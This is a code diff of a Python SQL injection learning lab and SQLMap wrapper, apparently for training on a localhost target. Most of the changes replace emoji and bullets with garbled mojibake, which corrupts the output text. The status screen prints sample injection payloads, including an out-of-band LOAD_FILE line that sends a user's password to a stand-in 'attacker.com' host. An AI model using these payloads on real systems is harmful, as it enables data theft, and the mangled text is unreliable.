-            info += f"  • [cyan]{user['username']}[/cyan] (Role: {user['role']}, Dept: {user['department']})\n"
+            info += f"  â€¢ [cyan]{user['username']}[/cyan] (Role: {user['role']}, Dept: {user['department']})\n"
         if len(users) > 5:
-            info += f"  • ... and {len(users) - 5} more users\n"
+            info += f"  â€¢ ... and {len(users) - 5} more users\n"
         
         info += f"""
-[bold yellow]🔑 Admin Credentials:[/bold yellow]
+[bold yellow]ðŸ”‘ Admin Credentials:[/bold yellow]
   Username: [bold cyan]{self.lab.current_credentials['username']}[/bold cyan]
   Password: [bold cyan]{self.lab.current_credentials['password']}[/bold cyan]
 
-[bold yellow]💉 Advanced SQL Injection Techniques:[/bold yellow]
+[bold yellow]ðŸ’‰ Advanced SQL Injection Techniques:[/bold yellow]
 """
         for tech_id, tech_data in ADVANCED_SQL_INJECTION_TECHNIQUES.items():
-            info += f"  • [cyan]{tech_data['name']}[/cyan] - {tech_data['category']} (MITRE: {tech_data['mitre_id']})\n"
+            info += f"  â€¢ [cyan]{tech_data['name']}[/cyan] - {tech_data['category']} (MITRE: {tech_data['mitre_id']})\n"
         
         info += f"""
-[bold yellow]🛡️ WAF Bypass Techniques:[/bold yellow]
+[bold yellow]ðŸ›¡ï¸ WAF Bypass Techniques:[/bold yellow]
 """
         for bypass_id, bypass_data in WAF_BYPASS_TECHNIQUES.items():
-            info += f"  • [yellow]{bypass_data['name']}[/yellow] - {bypass_data['description'][:40]}...\n"
+            info += f"  â€¢ [yellow]{bypass_data['name']}[/yellow] - {bypass_data['description'][:40]}...\n"
         
         info += f"""
-[bold yellow]📊 Database Stats:[/bold yellow]
+[bold yellow]ðŸ“Š Database Stats:[/bold yellow]
   Users: {len(users)}
   Products: {len(self.lab.get_all_products())}
   Logs: {len(self.lab.get_audit_logs(100))}
 
-[bold yellow]💡 Learning Objectives:[/bold yellow]
-  • Master basic and advanced SQL injection techniques
-  • Learn WAF bypass methods
-  • Understand second-order injection
-  • Practice out-of-band exfiltration
-  • Map attacks to MITRE ATT&CK framework
-  • Download PDF notes for offline reference
+[bold yellow]ðŸ’¡ Learning Objectives:[/bold yellow]
+  â€¢ Master basic and advanced SQL injection techniques
+  â€¢ Learn WAF bypass methods
+  â€¢ Understand second-order injection
+  â€¢ Practice out-of-band exfiltration
+  â€¢ Map attacks to MITRE ATT&CK framework
+  â€¢ Download PDF notes for offline reference
 
-[bold yellow]🔄 Second-Order Lab:[/bold yellow]
+[bold yellow]ðŸ”„ Second-Order Lab:[/bold yellow]
   Visit http://localhost:{self.lab.port}/second-order to practice second-order injection
 
-[bold yellow]📄 PDF Notes:[/bold yellow]
+[bold yellow]ðŸ“„ PDF Notes:[/bold yellow]
   Download comprehensive notes from the Learning Center or Techniques page
 """
-        self.console.print(Panel(info, title="[bold cyan]🧪 ADVANCED SQL INJECTION LEARNING LAB[/bold cyan]", border_style="cyan"))
+        self.console.print(Panel(info, title="[bold cyan]ðŸ§ª ADVANCED SQL INJECTION LEARNING LAB[/bold cyan]", border_style="cyan"))
     
     def scan(self, url: str, options: str = ""):
         """Run SQLMap scan on target URL with enhanced options"""
@@ -4464,10 +4464,10 @@ class EnhancedSQLMapScanner:
             return
         
         if not self.sqlmap_cmd:
-            self.console.print("[red]❌ SQLMap not available. Install with: sqlmap-install[/red]")
+            self.console.print("[red]âŒ SQLMap not available. Install with: sqlmap-install[/red]")
             return
         
-        self.console.print(f"\n[bold cyan]🔍 Running SQLMap scan on: {url}[/bold cyan]")
+        self.console.print(f"\n[bold cyan]ðŸ” Running SQLMap scan on: {url}[/bold cyan]")
         self.console.print("=" * 60)
         
         cmd = self.sqlmap_cmd.copy()
@@ -4489,7 +4489,7 @@ class EnhancedSQLMapScanner:
             ])
         
         self.console.print(f"[dim]Command: {' '.join(cmd)}[/dim]")
-        self.console.print("[yellow]⚠️ This may take several minutes...[/yellow]")
+        self.console.print("[yellow]âš ï¸ This may take several minutes...[/yellow]")
         
         try:
             process = subprocess.Popen(
@@ -4518,13 +4518,13 @@ class EnhancedSQLMapScanner:
             process.wait()
             
             if process.returncode == 0:
-                self.console.print("\n[green]✅ SQLMap scan completed successfully![/green]")
+                self.console.print("\n[green]âœ… SQLMap scan completed successfully![/green]")
                 self.console.print(f"[dim]Results saved to: {self.scans_dir}[/dim]")
             else:
-                self.console.print(f"\n[red]❌ SQLMap scan failed with code: {process.returncode}[/red]")
+                self.console.print(f"\n[red]âŒ SQLMap scan failed with code: {process.returncode}[/red]")
                 
         except Exception as e:
-            self.console.print(f"[red]❌ Error running SQLMap: {e}[/red]")
+            self.console.print(f"[red]âŒ Error running SQLMap: {e}[/red]")
     
     def cmd_advanced_status(self, args):
         """Show enhanced lab status"""
@@ -4535,52 +4535,52 @@ class EnhancedSQLMapScanner:
             logs = lab.get_audit_logs(100)
             attempts = lab.get_injection_attempts(10)
             
-            self.console.print("\n[bold cyan]📊 Advanced SQL Injection Lab Status[/bold cyan]")
+            self.console.print("\n[bold cyan]ðŸ“Š Advanced SQL Injection Lab Status[/bold cyan]")
             self.console.print("=" * 60)
             
             if lab.running:
-                self.console.print("[green]🖥️ Server: RUNNING ✅[/green]")
-                self.console.print(f"[yellow]🌐 URL:[/yellow] http://localhost:{lab.port}")
+                self.console.print("[green]ðŸ–¥ï¸ Server: RUNNING âœ…[/green]")
+                self.console.print(f"[yellow]ðŸŒ URL:[/yellow] http://localhost:{lab.port}")
             else:
-                self.console.print("[red]🖥️ Server: STOPPED ❌[/red]")
+                self.console.print("[red]ðŸ–¥ï¸ Server: STOPPED âŒ[/red]")
                 self.console.print("[dim]  Use 'advanced-sqllab' to start the server[/dim]")
             
             self.console.print("")
             
             if lab.secure_mode:
-                self.console.print("[green]🔒 Secure Mode: ENABLED ✅[/green]")
+                self.console.print("[green]ðŸ”’ Secure Mode: ENABLED âœ…[/green]")
                 self.console.print("[dim]  SQL injection is PREVENTED (parameterized queries)[/dim]")
             else:
-                self.console.print("[red]🔓 Secure Mode: DISABLED ❌[/red]")
+                self.console.print("[red]ðŸ”“ Secure Mode: DISABLED âŒ[/red]")
                 self.console.print("[dim]  SQL injection is POSSIBLE (vulnerable)[/dim]")
             
             if lab.waf_mode:
-                self.console.print("[green]🛡️ WAF Mode: ENABLED ✅[/green]")
+                self.console.print("[green]ðŸ›¡ï¸ WAF Mode: ENABLED âœ…[/green]")
                 self.console.print("[dim]  WAF is actively blocking injection attempts[/dim]")
             else:
-                self.console.print("[red]🔓 WAF Mode: DISABLED ❌[/red]")
+                self.console.print("[red]ðŸ”“ WAF Mode: DISABLED âŒ[/red]")
                 self.console.print("[dim]  WAF is not blocking injection attempts[/dim]")
             
             self.console.print("")
-            self.console.print(f"[yellow]👥 Total Users:[/yellow] {len(users)}")
-            self.console.print(f"[yellow]📦 Total Products:[/yellow] {len(products)}")
-            self.console.print(f"[yellow]📊 Audit Logs:[/yellow] {len(logs)}")
-            self.console.print(f"[yellow]💉 Injection Attempts:[/yellow] {len(attempts)}")
+            self.console.print(f"[yellow]ðŸ‘¥ Total Users:[/yellow] {len(users)}")
+            self.console.print(f"[yellow]ðŸ“¦ Total Products:[/yellow] {len(products)}")
+            self.console.print(f"[yellow]ðŸ“Š Audit Logs:[/yellow] {len(logs)}")
+            self.console.print(f"[yellow]ðŸ’‰ Injection Attempts:[/yellow] {len(attempts)}")
             
             if attempts:
                 successful = sum(1 for a in attempts if a['success'])
                 blocked = sum(1 for a in attempts if a['waf_blocked'])
-                self.console.print(f"[yellow]✅ Successful Injections:[/yellow] {successful}")
-                self.console.print(f"[yellow]🛡️ WAF Blocked:[/yellow] {blocked}")
-                self.console.print(f"[yellow]❌ Failed Injections:[/yellow] {len(attempts) - successful - blocked}")
+                self.console.print(f"[yellow]âœ… Successful Injections:[/yellow] {successful}")
+                self.console.print(f"[yellow]ðŸ›¡ï¸ WAF Blocked:[/yellow] {blocked}")
+                self.console.print(f"[yellow]âŒ Failed Injections:[/yellow] {len(attempts) - successful - blocked}")
             
             self.console.print("")
-            self.console.print("[yellow]🔑 Admin Credentials:[/yellow]")
+            self.console.print("[yellow]ðŸ”‘ Admin Credentials:[/yellow]")
             self.console.print(f"  [cyan]Username:[/cyan] {lab.current_credentials['username']}")
             self.console.print(f"  [cyan]Password:[/cyan] {lab.current_credentials['password']}")
             
             self.console.print("")
-            self.console.print("[yellow]💉 Advanced SQL Injection Examples:[/yellow]")
+            self.console.print("[yellow]ðŸ’‰ Advanced SQL Injection Examples:[/yellow]")
             self.console.print("  [cyan]Basic:[/cyan] [red]' OR '1'='1' --[/red]")
             self.console.print("  [cyan]Union:[/cyan] [red]' UNION SELECT 1,2,3,4,5,6,7,8 --[/red]")
             self.console.print("  [cyan]Time-based:[/cyan] [red]' AND SLEEP(5) --[/red]")
@@ -4588,11 +4588,11 @@ class EnhancedSQLMapScanner:
             self.console.print("  [cyan]Out-of-band:[/cyan] [red]' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\test')) --[/red]")
             
             self.console.print("")
-            self.console.print("[yellow]🔄 Second-Order Lab:[/yellow]")
+            self.console.print("[yellow]ðŸ”„ Second-Order Lab:[/yellow]")
             self.console.print(f"  [dim]http://localhost:{lab.port}/second-order[/dim]")
             
             self.console.print("")
-            self.console.print("[dim]💡 Commands:[/dim]")
+            self.console.print("[dim]ðŸ’¡ Commands:[/dim]")
             self.console.print("[dim]  advanced-sqllab - Start the lab[/dim]")
             self.console.print("[dim]  advanced-sqllab-stop - Stop the lab[/dim]")
             self.console.print("[dim]  advanced-sqlmap-secure - Toggle secure mode[/dim]")
@@ -4603,14 +4603,14 @@ class EnhancedSQLMapScanner:
             self.console.print("=" * 60)
             
         except Exception as e:
-            self.console.print(f"[red]❌ Error retrieving status: {e}[/red]")
+            self.console.print(f"[red]âŒ Error retrieving status: {e}[/red]")
     
     def cmd_advanced_techniques(self, args):
         """Show advanced SQL injection techniques"""
         if not self.console:
             return
         
-        self.console.print("\n[bold cyan]💉 Advanced SQL Injection Techniques Reference[/bold cyan]")
+        self.console.print("\n[bold cyan]ðŸ’‰ Advanced SQL Injection Techniques Reference[/bold cyan]")
         self.console.print("=" * 60)
         
         for tech_id, tech_data in ADVANCED_SQL_INJECTION_TECHNIQUES.items():
@@ -4624,12 +4624,12 @@ class EnhancedSQLMapScanner:
             if 'waf_bypass_payloads' in tech_data:
                 self.console.print(f"[yellow]WAF Bypass Payloads: {len(tech_data['waf_bypass_payloads'])}[/yellow]")
                 for payload in tech_data['waf_bypass_payloads'][:2]:
-                    self.console.print(f"[dim]  • {payload}[/dim]")
+                    self.console.print(f"[dim]  â€¢ {payload}[/dim]")
                 if len(tech_data['waf_bypass_payloads']) > 2:
-                    self.console.print(f"[dim]  • ... and {len(tech_data['waf_bypass_payloads']) - 2} more[/dim]")
+                    self.console.print(f"[dim]  â€¢ ... and {len(tech_data['waf_bypass_payloads']) - 2} more[/dim]")
             self.console.print("-" * 40)
         
-        self.console.print("\n[bold cyan]🛡️ WAF Bypass Techniques[/bold cyan]")
+        self.console.print("\n[bold cyan]ðŸ›¡ï¸ WAF Bypass Techniques[/bold cyan]")
         self.console.print("=" * 60)
         
         for bypass_id, bypass_data in WAF_BYPASS_TECHNIQUES.items():
@@ -4637,9 +4637,9 @@ class EnhancedSQLMapScanner:
             self.console.print(f"[dim]{bypass_data['description']}[/dim]")
             self.console.print(f"[cyan]Examples:[/cyan]")
             for example in bypass_data['examples'][:2]:
-                self.console.print(f"[dim]  • {example}[/dim]")
+                self.console.print(f"[dim]  â€¢ {example}[/dim]")
             if len(bypass_data['examples']) > 2:
-                self.console.print(f"[dim]  • ... and {len(bypass_data['examples']) - 2} more[/dim]")
+                self.console.print(f"[dim]  â€¢ ... and {len(bypass_data['examples']) - 2} more[/dim]")
             self.console.print(f"[green]Detection:[/green] {bypass_data['detection']}")
             self.console.print("-" * 40)
     
@@ -4648,39 +4648,39 @@ class EnhancedSQLMapScanner:
         if not self.console:
             return
         
-        self.console.print("\n[bold cyan]📄 Generating Advanced PDF Notes...[/bold cyan]")
+        self.console.print("\n[bold cyan]ðŸ“„ Generating Advanced PDF Notes...[/bold cyan]")
         
         if not REPORTLAB_AVAILABLE:
-            self.console.print("[red]❌ ReportLab not installed. Install with: pip install reportlab[/red]")
+            self.console.print("[red]âŒ ReportLab not installed. Install with: pip install reportlab[/red]")
             return
         
         pdf_path = self.lab.generate_pdf_notes()
         
         if pdf_path:
-            self.console.print(f"[green]✅ Advanced PDF Notes generated: {pdf_path}[/green]")
+            self.console.print(f"[green]âœ… Advanced PDF Notes generated: {pdf_path}[/green]")
             self.console.print(f"[dim]Location: {pdf_path}[/dim]")
             
             try:
                 webbrowser.open(f"file://{pdf_path}")
-                self.console.print("[green]✅ PDF opened in default viewer[/green]")
+                self.console.print("[green]âœ… PDF opened in default viewer[/green]")
             except:
                 pass
         else:
-            self.console.print("[red]❌ PDF generation failed.[/red]")
+            self.console.print("[red]âŒ PDF generation failed.[/red]")
     
     def cmd_advanced_secure(self, args):
         """Toggle secure mode"""
         self.lab.set_secure_mode(not self.lab.secure_mode)
         if self.console:
             status = "ENABLED" if self.lab.secure_mode else "DISABLED"
-            self.console.print(f"[green]✅ Secure mode: {status}[/green]")
+            self.console.print(f"[green]âœ… Secure mode: {status}[/green]")
     
     def cmd_advanced_waf(self, args):
         """Toggle WAF mode"""
         self.lab.set_waf_mode(not self.lab.waf_mode)
         if self.console:
             status = "ENABLED" if self.lab.waf_mode else "DISABLED"
-            self.console.print(f"[green]✅ WAF mode: {status}[/green]")
+            self.console.print(f"[green]âœ… WAF mode: {status}[/green]")
 
 
 # ============================================================
@@ -4756,7 +4756,7 @@ def main():
         scanner.scan(args.url, scan_options)
     else:
         if RICH_AVAILABLE and scanner.console:
-            scanner.console.print("\n[bold cyan]🔐 DSTERMINAL Advanced SQL Injection Suite v4.0[/bold cyan]")
+            scanner.console.print("\n[bold cyan]ðŸ” DSTERMINAL Advanced SQL Injection Suite v4.0[/bold cyan]")
             scanner.console.print("[1] Start Advanced SQL Injection Learning Lab")
             scanner.console.print("[2] Start Lab with WAF Enabled")
             scanner.console.print("[3] Start Lab with Secure Mode Enabled")
@@ -4808,11 +4808,11 @@ def main():
             elif choice == '9':
                 scanner.cmd_advanced_techniques(None)
             elif choice == '10':
-                scanner.console.print("\nGoodbye! 👋")
+                scanner.console.print("\nGoodbye! ðŸ‘‹")
             else:
-                scanner.console.print("\n❌ Invalid option. Please select 1-10.")
+                scanner.console.print("\nâŒ Invalid option. Please select 1-10.")
         else:
-            print("\n🔐 DSTERMINAL Advanced SQL Injection Suite v4.0")
+            print("\nðŸ” DSTERMINAL Advanced SQL Injection Suite v4.0")
             print("="*60)
             print("[1] Start Advanced SQL Injection Learning Lab")
             print("[2] Start Lab with WAF Enabled")
@@ -4866,9 +4866,9 @@ def main():
             elif choice == '9':
                 scanner.cmd_advanced_techniques(None)
             elif choice == '10':
-                print("\nGoodbye! 👋")
+                print("\nGoodbye! ðŸ‘‹")
             else:
-                print("\n❌ Invalid option. Please select 1-10.")
+                print("\nâŒ Invalid option. Please select 1-10.")
 
 
 # ============================================================
